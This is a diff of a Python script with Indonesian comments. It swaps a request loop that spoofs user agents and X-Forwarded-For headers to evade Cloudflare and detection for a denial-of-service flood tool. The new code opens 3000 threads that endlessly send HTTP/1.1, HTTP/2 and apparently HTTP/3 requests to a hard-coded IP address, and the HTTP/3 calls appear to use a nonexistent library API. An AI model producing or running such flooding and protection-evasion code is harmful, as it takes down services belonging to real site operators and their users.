@@ -1,37 +1,80 @@
-import requests
+import socket
+import ssl
+import threading
 import time
-import random
+import h2.connection
+import h2.events
+import h3
 
-# Daftar user agent
-user_agents = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1",
-    # Tambahkan user agent lainnya di sini
-]
+# Konfigurasi target
+target_ip = "138.201.139.144"
+target_port = 443
 
-def bypass_cloudflare(target_url):
-    headers = {
-        'User-Agent': random.choice(user_agents),
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-        'Accept-Language': 'en-US,en;q=0.5',
-        'Accept-Encoding': 'gzip, deflate',
-        'Connection': 'keep-alive',
-        'Upgrade-Insecure-Requests': '1',
-        'X-Forwarded-For': '127.0.0.1',  # Bypass 403 dengan X-Forwarded-For
-        'X-Real-IP': '127.0.0.1'  # Bypass 403 dengan X-Real-IP
-    }
-    
+# Fungsi untuk mengirim request HTTP/1.1
+def send_request_http1():
     while True:
         try:
-            response = requests.get(target_url, headers=headers)
-            print(f"Request sent! Status code: {response.status_code}")
-            time.sleep(0.1)  # Atur delay untuk menghindari deteksi
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((target_ip, target_port))
+            s.sendto(b"GET / HTTP/1.1\r\nHost: 138.201.139.144\r\n\r\n", (target_ip, target_port))
+            s.close()
         except Exception as e:
             print(f"Error: {e}")
 
-def main():
-    target_url = input("Masukkan target URL: ")
-    bypass_cloudflare(target_url)
+# Fungsi untuk mengirim request HTTP/2
+def send_request_http2():
+    while True:
+        try:
+            context = ssl.create_default_context()
+            context.set_alpn_protocols(['h2'])
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((target_ip, target_port))
+            ssl_socket = context.wrap_socket(s, server_hostname=target_ip)
+            conn = h2.connection.H2Connection()
+            conn.initiate_connection()
+            ssl_socket.sendall(conn.data_to_send())
+            while True:
+                data = ssl_socket.recv(1024)
+                if not data:
+                    break
+                events = conn.receive_data(data)
+                for event in events:
+                    if isinstance(event, h2.events.ResponseReceived):
+                        print(f"HTTP/2 Response: {event.headers}")
+            ssl_socket.close()
+        except Exception as e:
+            print(f"Error: {e}")
 
-if __name__ == "__main__":
-    main()
+# Fungsi untuk mengirim request HTTP/3
+def send_request_http3():
+    while True:
+        try:
+            quic = h3.Quic()
+            quic.connect((target_ip, target_port))
+            stream_id = quic.create_stream()
+            quic.send_request(stream_id, b"GET / HTTP/1.1\r\nHost: 138.201.139.144\r\n\r\n")
+            while True:
+                data = quic.recv()
+                if not data:
+                    break
+                print(f"HTTP/3 Response: {data}")
+            quic.close()
+        except Exception as e:
+            print(f"Error: {e}")
+
+# Buat thread untuk mengirim request
+threads = []
+for i in range(1000):
+    t1 = threading.Thread(target=send_request_http1)
+    t2 = threading.Thread(target=send_request_http2)
+    t3 = threading.Thread(target=send_request_http3)
+    threads.append(t1)
+    threads.append(t2)
+    threads.append(t3)
+    t1.start()
+    t2.start()
+    t3.start()
+
+# Tunggu semua thread selesai
+for t in threads:
+    t.join()
